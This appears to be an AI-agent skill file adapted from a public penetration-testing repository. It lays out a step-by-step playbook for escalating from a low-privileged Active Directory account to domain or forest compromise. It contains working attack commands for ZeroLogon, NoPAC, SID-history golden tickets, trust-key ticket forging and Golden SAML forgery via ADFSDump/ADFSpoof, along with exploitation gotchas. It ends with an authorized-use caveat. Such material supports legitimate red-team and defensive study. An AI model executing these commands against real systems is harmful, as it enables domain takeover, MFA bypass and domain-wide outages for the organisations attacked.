---
name: active-directory-domain-escalation
description: >-
  Escalate from a foothold to domain or forest compromise: ZeroLogon, PrintNightmare,
  NoPAC/sAMAccountName spoofing, MS14-068, PrivExchange, ResetNightmare, SID-history injection,
  trust-key and inter-realm ticket abuse, PAM trusts and ADFS Golden SAML. Use when you have
  low-privileged domain access and need a path to Domain Admin or forest takeover, when a trust
  relationship or ADFS federation exists, or when assessing unpatched legacy domain-controller
  CVEs.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "11"
  generated-by: build/build.py
---

# Active Directory Domain and Forest Escalation

Domain escalation means crossing a boundary you were not given: user→DA (a DC CVE or Exchange
relay), child→forest root (SID history), forest→forest (trust key, PAM), on-prem→cloud (Golden
SAML). Each path has one gate — patch level, `MachineAccountQuota`, SID filtering, installed role.
Find the gate first. Done means DA or forest-level access, proven.

## When to use this skill

- You hold a low-privileged domain account and the DCs may be unpatched (ZeroLogon, NoPAC,
  PrintNightmare, MS14-068, ResetNightmare).
- An Exchange server exists and you have any mailbox-enabled user (PrivExchange).
- Enumeration showed a parent/child or forest trust and you already have DA on your side.
- A PAM/bastion trust or AD FS federation is present.

For the initial credential or foothold, see `active-directory-credentials`; for what to do after
you hold krbtgt (golden tickets, DCSync), see `active-directory-kerberos`. For the coercion and
relay primitives these CVEs depend on, see `active-directory-lateral-movement`.

## First moves

1. **Fingerprint the DC patch level before anything else.** These CVEs are distinguishable in
   seconds and most engagements have exactly one of them:

   ```bash
   netexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
   netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
   nxc ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' -M MAQ
   ```

2. **ZeroLogon: verify, exploit, then immediately restore** — an unrestored machine password is a
   domain-wide denial of service:

   ```bash
   python3 zerologon_tester.py DC01 172.16.1.5
   python3 cve-2020-1472-exploit.py DC01 172.16.1.5
   # recover the old hash, then put the password back
   secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
   python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass <hex>
   ```

3. **NoPAC: check quota, then scan.** Requires `MachineAccountQuota > 0` and an unpatched DC:

   ```bash
   python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'
   noPac.exe scan -domain htb.local -user user -pass 'password123'
   ```

4. **Enumerate trusts before choosing a cross-domain path.** The direction determines the
   technique:

   ```bash
   nltest /trusted_domains
   nxc ldap <ip> -u <user> -p <pass> -M enum_trusts
   ```

5. **Child domain → forest root via SID history.** Take the child krbtgt hash, replace RID 502 with
   519 (Enterprise Admins) and add it as an extra SID:

   ```powershell
   kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local \
     /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
   ```

6. **Forest → forest via the trust key** (requires SID filtering disabled). Dump the trust account
   hash, forge an inter-realm TGT, then exchange it for a service ticket:

   ```powershell
   lsadump::trust /patch
   ticketer.py -nthash <TRUST_NT_HASH> -domain-sid <S-1-5-21-SID> -domain <domain.lab> \
     -extra-sid <S-1-5-21-SID_ENTERPRISE_ADM-519> -spn <krbtgt/domain.lab> <dummy name>
   .\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /ptt
   ```

7. **AD FS Golden SAML: dump the signing material, then forge assertions.** Works despite MFA and
   survives password resets:

   ```powershell
   # on the ADFS server, as the ADFS service account (queries the WID)
   ADFSDump.exe
   # DKM key lives in the thumbnailPhoto of the ADFS contact object
   ```

   ```bash
   python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 \
     --endpoint https://www.contoso.com/adfs/ls --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient \
     --nameid 'PENTEST\administrator' --rpidentifier Supervision
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [zerologon.md](references/zerologon.md) | DCs may predate the August 2020 Netlogon patch | tester/exploit scripts, mimikatz `lsadump::zerologon` + `postzerologon`, `-M zerologon`, relay variant with no service impact, mandatory restore |
| [nopac.md](references/nopac.md) | MAQ > 0 and DCs unpatched for CVE-2021-42278/42287 | sAMAccountName spoofing chain (create → clear SPN → rename → TGT → rename back → S4U2self), noPac/Pachine/sam-the-admin |
| [printnightmare.md](references/printnightmare.md) | the Print Spooler is reachable and patching is old | `rpcdump` MS-RPRN/MS-PAR detection, registry prerequisites, SMB/WebDAV payload hosting, CVE-2021-1675/34527 exploit tools, error codes |
| [ms14-068.md](references/ms14-068.md) | a DC is missing KB3011780 (pre-2014) | user SID discovery, pykek/metasploit PKINIT checksum forgery, `kerberos::ptc` |
| [privexchange.md](references/privexchange.md) | Exchange is installed and you have any mailbox user | push-subscription coercion, `ntlmrelayx -t ldap --escalate-user`, ACL restore, Exchange2domain |
| [resetnightmare.md](references/resetnightmare.md) | you can write your own `userPrincipalName` (CVE-2026-27912) | UPN set to target `sAMAccountName`, `kadmin/changepw` TGT via NT-ENTERPRISE, `badchangepw`, `KDC_ERR_TGT_REVOKED` boundary |
| [trust-relationship.md](references/trust-relationship.md) | a trust exists and you need the right technique per direction | trust enumeration, root/child/forest technique matrix |
| [sid-history.md](references/sid-history.md) | child domain DA → parent domain | krbtgt hash + RID 519 extra SID, `lookupsid.py` |
| [trust-ticket.md](references/trust-ticket.md) | forest-to-forest with SID filtering disabled | trust-key dumping (`lsadump::trust /patch`), Ticketer inter-realm TGT, `asktgs`, kirbikator |
| [pam-trust.md](references/pam-trust.md) | a bastion forest manages this one (Server 2016 or earlier) | PAM trust enumeration, shadow security principals, adding yourself as persistence |
| [adfs-golden-saml.md](references/adfs-golden-saml.md) | AD FS is federated to cloud or SaaS | DKM key in `thumbnailPhoto`, ADFSDump/ADFSpoof, saml2 vs o365 token shapes, WhiskeySAML, shimit |

## Workflow

1. **Enumerate first: patch level, MAQ, trusts, server roles.** These eliminate most branches;
   trust direction matters more than trust existence.
2. **DC-CVE branch — prefer the non-destructive option:**
   - ZeroLogon → exploit and restore, or use the relay variant (domain account, one DC with
     PrintSpooler, another vulnerable DC).
   - NoPAC (MAQ > 0, unpatched) → rename-spoof chain; cleanest with any domain user.
   - PrintNightmare → `rpcdump` check, then DLL via SMB (or WebDAV with WebClient running).
   - MS14-068 only on ancient DCs; confirm `get-hotfix 3011780` fails first.
   - ResetNightmare if you can write your own UPN — no special permissions at all.
3. **Trust branch — choose by direction**, mirroring the matrix in `trust-relationship.md`:
   root→child uses a golden ticket with the Enterprise Admins group; child→child and child→root
   use SID history; forest→forest needs the trust key and SID filtering disabled.
4. **PAM branch.** If the forest is managed by a bastion forest (Server 2016 or earlier), shadow
   security principals map to high-privilege groups in the managed forest — compromise the bastion
   and you inherit them.
5. **Federation branch.** AD FS present → dump the token-signing certificate and DKM key, then
   forge SAML for the relying party you want. No user password, MFA or conditional access applies
   to the forged assertion.
6. **Consolidate.** Every successful branch ends in krbtgt (or an equivalent) — move to
   `active-directory-kerberos` for golden tickets and `active-directory-credentials` for DCSync.

## Gotchas

- ZeroLogon sets the DC machine account password to empty. Failing to restore it breaks replication
  domain-wide; `secretsdump` recovers the old password.
- NoPAC leaves the machine renamed mid-attack: request the TGT *while* it bears the DC's name, then
  rename back. Order matters, and the new account consumes quota.
- PrintNightmare prerequisites are frequently misread: spooler enabled, patches older than June
  2021, and for the LPE variants `PointAndPrint\NoWarningNoElevationOnInstall = 1` plus
  `EnableLUA = 0`. WebDAV payloads need the **WebClient** service, absent on servers — check with
  `nxc smb -M webdav`.
- MS14-068 needs the target user's SID, obtainable without admin (`rpcclient lookupnames`,
  `netexec ldap --get-sid`). A DC patched with KB3011780 rejects the forged checksum outright.
- PrivExchange modifies the Exchange server's ACL on the domain object. `aclpwn.py --restore` from
  the saved restore file is part of the technique, not cleanup hygiene.
- Trust-ticket forgery requires SID filtering to be **disabled** on the trust. If it is enabled
  (the default for external trusts), the extra SID is stripped and the ticket silently loses its
  privilege — check before building the ticket.
- PAM trusts only work on Windows Server 2016 or earlier; the shadow-principal mechanism was
  changed afterwards.
- Golden SAML bypasses MFA and password resets, but assertions are time-bound: sync clocks, and try
  every master key found in the container.
- ResetNightmare's ticket cannot be used for a TGS request after the UPN change
  (`KDC_ERR_TGT_REVOKED`, due to the PAC_REQUESTOR_SID patch) — it is only good for constructing
  the password-change request. That is the intended path, not a failure.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Several of
these exploits are destructive (ZeroLogon, PrintNightmare, ResetNightmare). Confirm the rules of
engagement allow service impact, and restore state — especially DC machine passwords and modified
ACLs.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
